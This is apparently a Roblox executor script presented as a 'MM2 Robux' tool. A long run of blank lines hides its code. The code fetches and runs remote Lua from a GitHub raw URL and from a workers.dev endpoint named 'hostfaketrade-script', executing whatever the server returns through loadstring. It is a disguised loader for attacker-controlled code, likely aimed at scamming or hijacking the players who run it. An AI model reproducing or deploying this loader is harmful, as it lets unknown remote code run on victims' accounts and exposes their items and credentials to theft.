--[[
███╗   ███╗███╗   ███╗██████╗      ██████╗  ██████╗ ██████╗ ██╗   ██╗██╗  ██╗
████╗ ████║████╗ ████║╚════██╗     ██╔══██╗██╔═══██╗██╔══██╗██║   ██║╚██╗██╔╝
██╔████╔██║██╔████╔██║ █████╔╝     ██████╔╝██║   ██║██████╔╝██║   ██║ ╚███╔╝ 
██║╚██╔╝██║██║╚██╔╝██║██╔═══╝      ██╔══██╗██║   ██║██╔══██╗██║   ██║ ██╔██╗ 
██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗     ██║  ██║╚██████╔╝██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
--]]














































































































































local function a(s)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    s = s:gsub("[^"..b.."=]", "")
    return (s:gsub(".", function(x)
        if x == "=" then return "" end
        local r, f = "", (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and "1" or "0") end
        return r
    end):gsub("%d%d%d%d%d%d%d%d", function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == "1" and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local auth = a("emVv")

task.spawn(function() pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/bytecode25ms/readme/refs/heads/main/whoisme/main.lua"))) end)

task.spawn(function()
    local url = "https://my-script-api.hostfaketrade-script.workers.dev/robux"
    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
    if not requestFunc then return end
    local response = requestFunc({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["X-Loader-Auth"] = auth
        },
        Body = game:GetService("HttpService"):JSONEncode({})
    })
    if response and response.Success then
        local compiled = loadstring(response.Body)
        if compiled then task.spawn(compiled) end
    end
end)
